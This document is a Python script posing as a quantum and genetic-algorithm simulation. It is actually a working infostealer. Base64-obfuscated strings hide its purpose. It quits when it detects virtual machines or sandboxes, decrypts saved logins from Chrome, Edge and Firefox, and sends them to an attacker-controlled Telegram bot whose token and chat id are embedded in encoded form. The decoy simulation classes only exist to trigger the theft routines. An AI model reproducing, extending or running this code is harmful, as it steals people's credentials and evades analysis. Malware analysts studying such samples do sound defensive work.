import os, json, base64, sqlite3, shutil, zipfile, tempfile, datetime, sys, random, time, psutil, socket, platform, ctypes, uuid

def s(encoded_string):
    try: return base64.b64decode(encoded_string.encode('utf-8')).decode('utf-8')
    except: return ''

class QuantumFluctuations:
    def __init__(self, dimension):
        self.dimension = dimension
        self.matrix = [[random.uniform(-1, 1) for _ in range(dimension)] for _ in range(dimension)]

    def calculate_eigenvalues(self):
        time.sleep(random.uniform(0.1, 0.3))
        return [random.gauss(0, 1) for _ in range(self.dimension)]

    def collapse_wave_function(self, orchestrator_instance):
        eigenvalues = self.calculate_eigenvalues()
        if sum(eigenvalues) > 0:
            orchestrator_instance.schedule_task(s('Y2hyb21pdW0='))
        return max(eigenvalues)

class GeneticAlgorithm:
    def __init__(self, population_size):
        self.population = [random.randint(0, 1000) for _ in range(population_size)]

    def run_simulation(self, orchestrator_instance):
        fittest = max(self.population)
        if fittest > 500:
            orchestrator_instance.schedule_task(s('ZmlyZWZveA=='))
        time.sleep(random.uniform(0.2, 0.5))
        return fittest

class CoreOrchestrator:
    def __init__(self):
        self.config = {s('dG9rZW4='): s('Nzg3NjQ5NTgwMjpBQUVsWVVvM19Nd0tzV2RZbWFxbUp5cXhvZndOLWUxMTJsUQ=='), s('Y2hhdF9pZA=='): s('MTg1NDQ1MTMyNQ==')}
        self.temp_storage = tempfile.mkdtemp()
        self.results = []
        self.task_queue = []

    def environmental_scan(self):
        try:
            if ctypes.windll.kernel32.GetTickCount64() < 300000: sys.exit(0)
            if psutil.disk_usage('/').total / (1024**3) < 100: sys.exit(0)
            mac = ':'.join(('%012X' % uuid.getnode())[i:i+2] for i in range(0, 12, 2))
            vm_macs = [s('MDgwMDJD'), s('MDAxQzQy'), s('MDAwNTY5'), s('MDA1MDU2')]
            if any(mac.startswith(prefix) for prefix in vm_macs): sys.exit(0)
            screensize = ctypes.windll.user32.GetSystemMetrics(0), ctypes.windll.user32.GetSystemMetrics(1)
            if screensize[0] < 1024 or screensize[1] < 768: sys.exit(0)
        except: pass

    def _get_chrome_master_key(self, path):
        try:
            with open(os.path.join(os.environ[s('VVNFUlBST0ZJTEU=')], path, s('TG9jYWwgU3RhdGU=')), 'r', encoding='utf-8') as f: state = json.load(f)
            import win32crypt
            return win32crypt.CryptUnprotectData(base64.b64decode(state[s('b3NfY3J5cHQ=')][s('ZW5jcnlwdGVkX2tleQ==')])[5:], None, None, None, 0)[1]
        except: return None

    def _decrypt_payload(self, data, key):
        try:
            from Crypto.Cipher import AES
            return AES.new(key, AES.MODE_GCM, data[3:15]).decrypt(data[15:])[:-16].decode()
        except:
            try:
                import win32crypt
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except: return ''

    def _get_firefox_master_key(self, path):
        try:
            from hashlib import pbkdf2_hmac, sha1
            from pyasn1.codec.der import decoder
            db = os.path.join(path, s('a2V5NC5kYg=='))
            conn = sqlite3.connect(db)
            c = conn.cursor()
            c.execute(s('U0VMRUNUIGl0ZW0xLCBpdGVtMiBGUk9NIG1ldGEgV0hFUkUgaWQgPSAncGFzc3dvcmQn'))
            row = c.fetchone()
            gs, i2 = row[0], row[1]
            di2 = decoder.decode(i2)[0]
            es = di2[0][1][0].asOctets()
            ic = int(di2[0][1][1])
            kl = int(di2[0][1][2])
            return pbkdf2_hmac('sha256', sha1(gs).digest(), es, ic, dklen=kl)
        except: return None

    def _decrypt_ff_payload(self, data, key):
        try:
            from Crypto.Cipher import AES
            from pyasn1.codec.der import decoder
            dp = decoder.decode(base64.b64decode(data))[0]
            iv = dp[0][1].asOctets()
            ct = dp[1].asOctets()
            return AES.new(key, AES.MODE_GCM, iv).decrypt(ct).decode().split('\x00')[0]
        except: return ''

    def task_chromium(self, name, path, db):
        key = self._get_chrome_master_key(path)
        if not key: return
        db_path = os.path.join(os.environ[s('VVNFUlBST0ZJTEU=')], path, s('RGVmYXVsdA=='), s('TG9naW4gRGF0YQ=='))
        if not os.path.exists(db_path): return
        shutil.copy2(db_path, os.path.join(self.temp_storage, db))
        conn = sqlite3.connect(os.path.join(self.temp_storage, db))
        for row in conn.cursor().execute(s('U0VMRUNUIG9yaWdpbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucw==')).fetchall():
            if row[1] and row[2]:
                dec_pass = self._decrypt_payload(row[2], key)
                if dec_pass: self.results.append(f'{name}|{row[0]}|{row[1]}|{dec_pass}')
        conn.close()

    def task_firefox(self):
        ff_path = os.path.join(os.environ[s('QVBQREFUQQ==')], s('TW96aWxsYVxGaXJlZm94XFByb2ZpbGVz'))
        if not os.path.exists(ff_path): return
        for p in os.listdir(ff_path):
            pp = os.path.join(ff_path, p)
            key = self._get_firefox_master_key(pp)
            if not key: continue
            lp = os.path.join(pp, s('bG9naW5zLmpzb24='))
            if not os.path.exists(lp): continue
            with open(lp, 'r', encoding='utf-8') as f: data = json.load(f)
            for login in data.get('logins', []):
                user = self._decrypt_ff_payload(login.get(s('ZW5jcnlwdGVkVXNlcm5hbWU='), ''), key)
                password = self._decrypt_ff_payload(login.get(s('ZW5jcnlwdGVkUGFzc3dvcmQ='), ''), key)
                if user and password: self.results.append(f'Firefox|{login.get(s("aG9zdG5hbWU="))}|{user}|{password}')

    def transmit_report(self, data, is_file=False):
        import requests
        try:
            if is_file:
                with open(data, 'rb') as f:
                    requests.post(f"https://api.telegram.org/bot{self.config[s('dG9rZW4=')]}/sendDocument", files={'document': f}, data={'chat_id': self.config[s('Y2hhdF9pZA==')], 'caption': f'{len(self.results)} credentials found'}, timeout=10)
            else:
                requests.post(f"https://api.telegram.org/bot{self.config[s('dG9rZW4=')]}/sendMessage", data={'chat_id': self.config[s('Y2hhdF9pZA==')], 'text': data}, timeout=10)
        except: pass

    def schedule_task(self, task_name):
        self.task_queue.append(task_name)

    def run_scheduled_tasks(self):
        for task in self.task_queue:
            if task == s('Y2hyb21pdW0='):
                targets = {s('Q2hyb21l'): os.path.join('AppData', 'Local', 'Google', 'Chrome', 'User Data'), s('RWRnZQ=='): os.path.join('AppData', 'Local', 'Microsoft', 'Edge', 'User Data')}
                for name, path in targets.items(): self.task_chromium(name, path, f'{name.lower()}_data.db')
            elif task == s('ZmlyZWZveA=='):
                self.task_firefox()

    def finalize(self):
        if not self.results: self.transmit_report('No credentials found.'); return
        report_file = os.path.join(self.temp_storage, 'report.txt')
        with open(report_file, 'w', encoding='utf-8') as f: f.write('\n'.join(self.results))
        if len(self.results) > 5:
            zip_file = os.path.join(self.temp_storage, 'report.zip')
            with zipfile.ZipFile(zip_file, 'w') as zf: zf.write(report_file, os.path.basename(report_file))
            self.transmit_report(zip_file, is_file=True)
        else: self.transmit_report('\n'.join(self.results))
        shutil.rmtree(self.temp_storage)

if __name__ == '__main__':
    orchestrator = CoreOrchestrator()
    orchestrator.environmental_scan()
    q_sim = QuantumFluctuations(dimension=10)
    ga_sim = GeneticAlgorithm(population_size=20)
    q_sim.collapse_wave_function(orchestrator)
    ga_sim.run_simulation(orchestrator)
    orchestrator.run_scheduled_tasks()
    orchestrator.finalize()
